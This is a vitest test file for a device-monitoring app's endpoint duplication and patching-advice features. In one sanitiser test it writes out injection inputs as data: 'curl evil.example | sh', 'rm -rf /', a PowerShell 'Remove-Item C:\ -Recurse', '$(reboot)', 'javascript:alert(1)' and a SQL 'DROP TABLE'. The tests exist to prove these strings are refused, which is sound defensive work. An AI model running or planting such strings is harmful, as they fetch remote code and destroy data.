// Tests for two 5.9 features: duplicating an endpoint (through the real HTTP
// route and a real test database) and the "how to fix" patching advice on
// software check results. Each test says what behaviour or attack it proves.

import "dotenv/config";
import crypto from "node:crypto";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import request from "supertest";
import bcrypt from "bcryptjs";
import { eq, inArray } from "drizzle-orm";
import { app } from "../src/app.js";
import { loginWith2fa } from "./helpers.js";
import { db } from "../src/db/index.js";
import { alertRules, checkDependencies, checks, endpoints, groupMembers, groups, sites, users } from "../src/db/schema.js";
import { adviceForEol, adviceForUpgradable, adviceForVulnerable, adviceForWindowsUpdate, fixedVersions, isSafeName, isSafePath, safeLink } from "../src/services/fixAdvice.js";
import { evaluatePackages, type SoftwareReport } from "../src/services/software.js";

const email = `test-v59-${crypto.randomUUID()}@example.com`;
const password = "TestPass123";
let cookie: string;
let siteId: string;
let otherSiteId: string;

beforeAll(async () => {
  await db.insert(users).values({ email, passwordHash: await bcrypt.hash(password, 10) });
  cookie = await loginWith2fa(email, password);
  const [a] = await db.insert(sites).values({ name: `test-v59-a-${crypto.randomUUID()}` }).returning();
  const [b] = await db.insert(sites).values({ name: `test-v59-b-${crypto.randomUUID()}` }).returning();
  siteId = a.id;
  otherSiteId = b.id;
});

afterAll(async () => {
  await db.delete(users).where(eq(users.email, email));
  await db.delete(sites).where(inArray(sites.id, [siteId, otherSiteId]));
});

describe("duplicating an endpoint", () => {
  // Proves the copy gets the setup (checks with their settings, alert rules,
  // internal dependencies re-pointed at the copies, groups, tags), a check
  // setting equal to the old address moves to the new address, and the
  // machine's own identity — agent key, reported data, MAC — is not copied.
  it("copies the setup but not the machine", async () => {
    const auth = { Cookie: cookie };
    const src = await request(app).post("/api/endpoints").set(auth).send({ siteId, name: "switch-1", hostname: "10.9.0.1", os: "RouterOS", macAddress: "aa:bb:cc:dd:ee:01", tags: ["core"] });
    expect(src.status).toBe(201);
    const id = src.body.id as string;
    // The original has an agent key and reported data; neither may be copied.
    await request(app).post(`/api/endpoints/${id}/agent-key`).set(auth);
    await db.update(endpoints).set({ inventory: { serial: "ABC123" }, lastSeenAt: new Date() }).where(eq(endpoints.id, id));
    const [group] = await db.insert(groups).values({ name: `g-${crypto.randomUUID()}`, kind: "manual" } as never).returning();
    await db.insert(groupMembers).values({ groupId: group.id, memberType: "endpoint", memberId: id });

    const ping = await request(app).post("/api/checks").set(auth).send({ siteId, endpointId: id, name: "ping", type: "ping", config: { host: "10.9.0.1" } });
    const http = await request(app).post("/api/checks").set(auth).send({ siteId, endpointId: id, name: "web", type: "http", config: { url: "http://10.9.0.1/", expectedStatus: 200 }, dependsOn: [ping.body.id] });
    expect(ping.status).toBe(201);
    expect(http.status).toBe(201);
    await request(app).post("/api/alert-rules").set(auth).send({ checkId: ping.body.id, consecutiveFailures: 3, channelIds: [] });

    const res = await request(app).post(`/api/endpoints/${id}/duplicate`).set(auth).send({ name: "switch-2", hostname: "10.9.0.2", siteId: otherSiteId });
    expect(res.status).toBe(201);
    expect(res.body.checksCopied).toBe(2);
    const copy = res.body.endpoint;
    expect(copy).toMatchObject({ name: "switch-2", hostname: "10.9.0.2", os: "RouterOS", siteId: otherSiteId, tags: ["core"], hasAgentKey: false, macAddress: null, inventory: null, lastSeenAt: null });

    const copied = await db.query.checks.findMany({ where: eq(checks.endpointId, copy.id) });
    const copiedPing = copied.find((c) => c.type === "ping")!;
    const copiedHttp = copied.find((c) => c.type === "http")!;
    expect((copiedPing.config as { host: string }).host).toBe("10.9.0.2");
    expect(copiedPing.siteId).toBe(otherSiteId);
    // Only a setting that is exactly the old address changes; a URL containing it doesn't.
    expect((copiedHttp.config as { url: string }).url).toBe("http://10.9.0.1/");
    const deps = await db.query.checkDependencies.findMany({ where: eq(checkDependencies.checkId, copiedHttp.id) });
    expect(deps.map((d) => d.dependsOnCheckId)).toEqual([copiedPing.id]);
    expect(await db.query.alertRules.findMany({ where: eq(alertRules.checkId, copiedPing.id) })).toHaveLength(1);
    const member = await db.query.groupMembers.findFirst({ where: eq(groupMembers.memberId, copy.id) });
    expect(member?.groupId).toBe(group.id);

    // The original's agent key can't report as the copy: the copy has none.
    const row = await db.query.endpoints.findFirst({ where: eq(endpoints.id, copy.id) });
    expect(row?.agentApiKey).toBeNull();

    await db.delete(groups).where(eq(groups.id, group.id));
    await db.delete(endpoints).where(inArray(endpoints.id, [id, copy.id]));
  });

  // Proves bad input is refused: no name, an unknown site, an unknown endpoint.
  it("refuses bad input", async () => {
    const auth = { Cookie: cookie };
    const src = await request(app).post("/api/endpoints").set(auth).send({ siteId, name: "printer-1" });
    const id = src.body.id as string;
    expect((await request(app).post(`/api/endpoints/${id}/duplicate`).set(auth).send({ name: "  " })).status).toBe(400);
    expect((await request(app).post(`/api/endpoints/${id}/duplicate`).set(auth).send({ name: "x", siteId: crypto.randomUUID() })).status).toBe(400);
    expect((await request(app).post(`/api/endpoints/${id}/duplicate`).set(auth).send({ name: "x", siteId: "'; DROP TABLE sites; --" })).status).toBe(400);
    expect((await request(app).post(`/api/endpoints/${crypto.randomUUID()}/duplicate`).set(auth).send({ name: "x" })).status).toBe(404);
    // copyChecks: false copies no checks.
    await request(app).post("/api/checks").set(auth).send({ siteId, endpointId: id, name: "ping", type: "ping", config: { host: "10.9.0.5" } });
    const bare = await request(app).post(`/api/endpoints/${id}/duplicate`).set(auth).send({ name: "printer-2", copyChecks: false });
    expect(bare.body.checksCopied).toBe(0);
    await db.delete(endpoints).where(inArray(endpoints.id, [id, bare.body.endpoint.id]));
  });

  // Proves the route needs a signed-in session (401 without one).
  it("requires sign-in", async () => {
    const res = await request(app).post(`/api/endpoints/${crypto.randomUUID()}/duplicate`).send({ name: "x" });
    expect(res.status).toBe(401);
  });
});

/** A small Ubuntu 24.04 software report: openssl built into two binary packages. */
const ubuntu = (upgradable: SoftwareReport["upgradable"] = []): SoftwareReport => ({
  collectedAt: Date.now(),
  upgradableAt: Date.now(),
  os: { id: "ubuntu", versionId: "24.04" },
  packages: [
    { n: "openssl", v: "3.0.13-0ubuntu3.1", s: "dpkg", o: "openssl" },
    { n: "libssl3t64", v: "3.0.13-0ubuntu3.1", s: "dpkg", o: "openssl" },
  ],
  upgradable,
});
const vuln = { name: "openssl", version: "3.0.13-0ubuntu3.1", source: "dpkg", advisoryId: "UBUNTU-CVE-2024-5535", aliases: ["CVE-2024-5535"] };

describe("patching advice", () => {
  // Proves each Debian/Ubuntu case gets its own explanation and command:
  // kept back (offered but not installed), phased, Ubuntu Pro only, no fix
  // yet, and fixed-but-not-offered — and that commands name the binary
  // packages apt installs, not the source package.
  it("explains why apt didn't fix it", () => {
    const kept = adviceForVulnerable({ ...vuln, fixed: ["3.0.13-0ubuntu3.2"] }, ubuntu([{ name: "libssl3t64", source: "apt" }]));
    expect(kept.command).toBe("sudo apt update && sudo apt install --only-upgrade openssl libssl3t64");
    expect(kept.help).toBe("/help/patching#apt-kept-back");
    expect(kept.link).toBe("https://ubuntu.com/security/CVE-2024-5535");

    expect(adviceForVulnerable({ ...vuln, fixed: ["3.0.13-0ubuntu3.2"] }, ubuntu([{ name: "openssl", source: "apt", phased: true }])).command).toContain("Always-Include-Phased-Updates=true");
    expect(adviceForVulnerable({ ...vuln, fixed: ["3.0.13-0ubuntu3.1+esm1"] }, ubuntu()).help).toBe("/help/patching#ubuntu-pro");
    const none = adviceForVulnerable({ ...vuln, fixed: [] }, ubuntu());
    expect(none.help).toBe("/help/patching#no-fix-yet");
    expect(none.command).toBe("pro fix CVE-2024-5535");
    expect(adviceForVulnerable({ ...vuln, fixed: ["3.0.13-0ubuntu3.2"] }, ubuntu()).help).toBe("/help/patching#apt-not-offered");
  });

  // Proves application dependencies are explained as never touched by OS
  // updates, with a command run in the lock file's folder.
  it("handles npm, pip and Composer dependencies", () => {
    const sw = ubuntu();
    const npm = adviceForVulnerable({ name: "lodash", version: "4.17.20", source: "npm", path: "/srv/app/package-lock.json", fixed: ["4.17.21"], advisoryId: "GHSA-35jh-r3h4-6jhm", aliases: [] }, sw);
    expect(npm.fix).toContain("OS updates never change these");
    expect(npm.command).toContain('cd "/srv/app" && npm audit fix');
    expect(npm.link).toBe("https://osv.dev/vulnerability/GHSA-35jh-r3h4-6jhm");
    expect(adviceForVulnerable({ name: "requests", version: "2.0", source: "pip", fixed: ["2.32.0"], advisoryId: "PYSEC-1", aliases: [] }, sw).command).toBe('python3 -m pip install --upgrade "requests>=2.32.0"');
  });

  // Proves a crafted package name or path from an agent never becomes part
  // of a suggested command (an admin may paste it into a root shell), and
  // a non-http advisory link from OSV data is dropped.
  it("never puts unsafe names or paths into commands", () => {
    const evil = { ...ubuntu(), packages: [{ n: "x; curl evil.example | sh", v: "1", s: "dpkg", o: "openssl" }] };
    const a = adviceForVulnerable({ ...vuln, fixed: ["3.0.14"] }, { ...evil, upgradable: [{ name: "x; curl evil.example | sh", source: "apt" }] });
    expect(a.command ?? "").not.toContain("evil");
    const p = adviceForVulnerable({ name: "lodash", version: "1", source: "npm", path: '/srv/a"; rm -rf / #/package-lock.json', fixed: ["2"], advisoryId: "X-1", aliases: [] }, ubuntu());
    expect(p.command).toBeNull();
    // A backslash only in a drive-letter Windows path: elsewhere a trailing
    // one would escape the closing quote of cd "…".
    expect(isSafePath("/srv/app\\")).toBe(false);
    expect(isSafePath("C:\\inetpub\\app")).toBe(true);
    expect(isSafeName("-rf")).toBe(false);
    expect(isSafeName("@babel/core")).toBe(true);
    // PowerShell also ends a string at a curly quote: refused too.
    const curly = adviceForVulnerable({ name: "lodash", version: "1", source: "npm", path: "C:\\app\u201D; Remove-Item C:\\ -Recurse #\\package-lock.json", fixed: ["2"], advisoryId: "X-1", aliases: [] }, ubuntu());
    expect(curly.command).toBeNull();
    expect(adviceForUpgradable({ name: "$(reboot)", source: "apt" }).command).not.toContain("reboot");
    expect(safeLink("javascript:alert(1)")).toBeNull();
    expect(safeLink("https://example.org/a")).toBe("https://example.org/a");
  });

  // Proves Windows Update items get the right kind of advice, and the
  // Update Catalog link for a KB.
  it("explains Windows Update leftovers", () => {
    expect(adviceForWindowsUpdate("Intel Corporation - Display - 31.0.101.5186").help).toBe("/help/patching#windows-drivers");
    expect(adviceForWindowsUpdate("Security Intelligence Update for Microsoft Defender Antivirus - KB2267602").command).toBe("Update-MpSignature");
    expect(adviceForWindowsUpdate("Windows 11, version 24H2").help).toBe("/help/patching#windows-feature");
    expect(adviceForWindowsUpdate("2026-11 Cumulative Update for Windows 11 (KB5070000)").link).toBe("https://www.catalog.update.microsoft.com/Search.aspx?q=KB5070000");
  });

  // Proves end-of-life advice links endoflife.date and says no update fixes it.
  it("gives an upgrade path for end of life", () => {
    const a = adviceForEol("nodejs", false);
    expect(a.link).toBe("https://endoflife.date/nodejs");
    expect(a.fix).toContain("No update to the current version fixes this");
  });

  // Proves fixed versions are taken from the matching package and ecosystem only.
  it("reads fixed versions from OSV data", () => {
    const affected = [
      { ecosystem: "Ubuntu:24.04:LTS", name: "openssl", fixed: ["3.0.13-0ubuntu3.2"] },
      { ecosystem: "Debian:12", name: "openssl", fixed: ["3.0.14-1~deb12u1"] },
      { ecosystem: "Ubuntu:24.04:LTS", name: "curl", fixed: ["8.5.0-2ubuntu10.2"] },
    ];
    expect(fixedVersions(affected, "openssl", "Ubuntu:24.04:LTS")).toEqual(["3.0.13-0ubuntu3.2"]);
  });

  // Proves the Upgradable packages result carries the advice on each row.
  it("adds advice to upgradable packages", () => {
    const out = evaluatePackages(ubuntu([{ name: "curl", source: "apt", security: true }]), {});
    const rows = (out.details as { packages: { name: string; command: string; help: string }[] }).packages;
    expect(rows[0]).toMatchObject({ name: "curl", command: "sudo apt update && sudo apt install --only-upgrade curl", help: "/help/patching#apt-kept-back" });
  });
});
